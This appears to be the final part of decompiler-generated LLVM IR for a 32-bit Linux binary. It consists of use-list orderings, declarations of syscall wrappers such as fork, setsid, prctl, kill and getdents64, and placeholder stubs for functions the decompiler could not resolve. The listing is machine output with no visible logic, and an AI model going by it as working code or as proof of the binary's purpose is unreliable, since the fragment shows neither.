  uselistorder i32* @eax, { 9, 47, 48, 50, 51, 52, 53, 55, 17, 56, 1, 54, 6, 8, 49, 57, 59, 60, 58, 25, 26, 61, 67, 62, 63, 65, 66, 64, 34, 35, 18, 2, 3, 10, 11, 27, 28, 29, 33, 30, 31, 32, 5, 19, 36, 12, 37, 38, 39, 13, 40, 0, 14, 15, 41, 42, 43, 44, 16, 68, 20, 21, 24, 69, 70, 71, 72, 73, 22, 23, 74, 45, 46, 4, 7 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, { 657, 65, 381, 66, 454, 455, 67, 456, 457, 458, 68, 138, 139, 557, 558, 69, 460, 658, 659, 660, 193, 661, 662, 663, 443, 559, 560, 664, 441, 440, 665, 666, 667, 442, 561, 562, 563, 564, 438, 668, 669, 670, 70, 671, 140, 676, 677, 10, 71, 382, 11, 383, 384, 679, 680, 132, 681, 72, 366, 73, 194, 195, 0, 672, 673, 674, 74, 439, 376, 75, 385, 682, 1, 141, 142, 76, 683, 684, 77, 78, 686, 685, 26, 27, 687, 690, 196, 367, 691, 693, 692, 24, 25, 694, 675, 565, 566, 567, 568, 386, 387, 49, 569, 192, 388, 143, 79, 695, 30, 368, 80, 144, 699, 702, 701, 28, 29, 705, 706, 707, 708, 709, 145, 710, 711, 712, 197, 703, 198, 704, 199, 389, 444, 60, 445, 146, 390, 446, 713, 714, 715, 716, 717, 718, 719, 720, 721, 147, 148, 722, 391, 734, 392, 393, 200, 369, 394, 201, 370, 81, 395, 723, 724, 82, 83, 202, 371, 62, 725, 726, 727, 84, 85, 203, 372, 61, 728, 133, 729, 51, 730, 731, 733, 396, 732, 2, 700, 688, 689, 447, 448, 450, 449, 31, 32, 3, 149, 451, 452, 453, 459, 570, 571, 397, 398, 572, 573, 574, 575, 576, 577, 578, 579, 399, 461, 580, 735, 698, 462, 736, 581, 582, 463, 678, 63, 150, 696, 464, 583, 697, 584, 737, 465, 738, 739, 400, 740, 8, 86, 401, 741, 204, 742, 743, 151, 744, 12, 33, 52, 13, 53, 14, 745, 4, 34, 54, 15, 55, 16, 88, 87, 56, 17, 89, 90, 466, 64, 585, 586, 91, 402, 378, 746, 747, 748, 749, 750, 751, 94, 93, 92, 752, 159, 96, 95, 97, 403, 753, 130, 404, 467, 405, 406, 9, 98, 407, 57, 18, 99, 408, 100, 409, 410, 411, 490, 470, 471, 472, 474, 475, 491, 492, 493, 494, 495, 496, 476, 412, 413, 501, 502, 503, 504, 505, 500, 488, 489, 468, 469, 497, 498, 499, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 19, 135, 136, 131, 414, 101, 415, 506, 554, 555, 507, 508, 509, 416, 510, 511, 512, 513, 514, 516, 102, 551, 552, 553, 134, 515, 417, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 379, 418, 529, 419, 103, 420, 531, 532, 533, 534, 535, 536, 152, 153, 537, 538, 539, 421, 473, 546, 547, 548, 549, 540, 541, 542, 550, 104, 154, 530, 105, 373, 556, 155, 106, 167, 587, 107, 174, 175, 176, 165, 166, 35, 36, 588, 589, 590, 108, 47, 591, 592, 593, 594, 109, 46, 595, 596, 597, 598, 110, 45, 599, 600, 601, 602, 111, 44, 603, 604, 605, 168, 169, 170, 171, 172, 173, 606, 607, 163, 162, 608, 160, 7, 6, 161, 609, 164, 610, 177, 611, 178, 612, 179, 613, 180, 614, 616, 617, 618, 615, 619, 620, 181, 182, 621, 156, 622, 157, 112, 645, 20, 58, 374, 422, 423, 424, 623, 629, 183, 624, 625, 184, 626, 185, 627, 186, 628, 39, 630, 187, 188, 631, 189, 632, 633, 190, 634, 191, 635, 636, 637, 638, 425, 639, 640, 641, 642, 38, 205, 113, 114, 426, 427, 643, 644, 48, 59, 115, 428, 37, 206, 208, 209, 429, 116, 117, 207, 375, 118, 543, 544, 545, 21, 119, 380, 22, 210, 120, 121, 646, 647, 648, 649, 650, 651, 754, 755, 652, 653, 756, 757, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 758, 759, 760, 761, 762, 763, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 43, 819, 820, 821, 822, 823, 824, 825, 122, 430, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 431, 864, 856, 857, 858, 859, 860, 861, 862, 863, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 123, 432, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 211, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 940, 939, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 124, 433, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 125, 434, 989, 990, 377, 991, 992, 435, 993, 994, 995, 126, 436, 996, 50, 997, 23, 40, 41, 42, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 158, 127, 128, 5, 654, 655, 656, 129, 437, 137, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013 }
  uselistorder i32* @ebx, { 20, 346, 347, 205, 206, 45, 348, 2, 349, 350, 351, 352, 23, 24, 353, 22, 354, 355, 356, 357, 358, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 3, 226, 227, 228, 21, 359, 360, 361, 362, 363, 364, 365, 366, 367, 18, 19, 376, 377, 378, 379, 15, 4, 14, 370, 373, 374, 375, 368, 380, 381, 382, 383, 384, 385, 386, 387, 369, 229, 230, 396, 397, 398, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 5, 413, 414, 399, 400, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 6, 36, 37, 38, 39, 40, 41, 42, 415, 440, 441, 442, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 16, 426, 427, 428, 429, 430, 7, 431, 432, 433, 434, 435, 436, 437, 438, 439, 394, 395, 43, 44, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 46, 259, 260, 443, 444, 392, 393, 47, 445, 446, 261, 262, 263, 264, 48, 371, 372, 388, 389, 49, 265, 266, 390, 391, 267, 268, 447, 448, 50, 449, 450, 451, 51, 269, 270, 8, 271, 272, 52, 53, 452, 453, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 177, 178, 179, 180, 162, 166, 167, 165, 181, 164, 168, 169, 170, 150, 151, 182, 163, 171, 172, 173, 174, 175, 176, 183, 184, 185, 186, 187, 188, 189, 190, 200, 201, 9, 202, 191, 192, 193, 194, 195, 196, 197, 198, 199, 203, 204, 275, 273, 274, 0, 276, 277, 278, 279, 280, 281, 10, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 17, 331, 332, 333, 334, 335, 336, 337, 454, 455, 456, 338, 339, 340, 341, 457, 458, 459, 460, 11, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 461, 462, 463, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 1, 493, 494, 495, 496, 497, 13, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 12, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 342, 343, 344, 345 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @chdir(i8*) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @getppid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32* @mremap(i32*, i32, i32, i32, ...) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr

declare i64 @__decompiler_undefined_function_5() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare %tms* @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
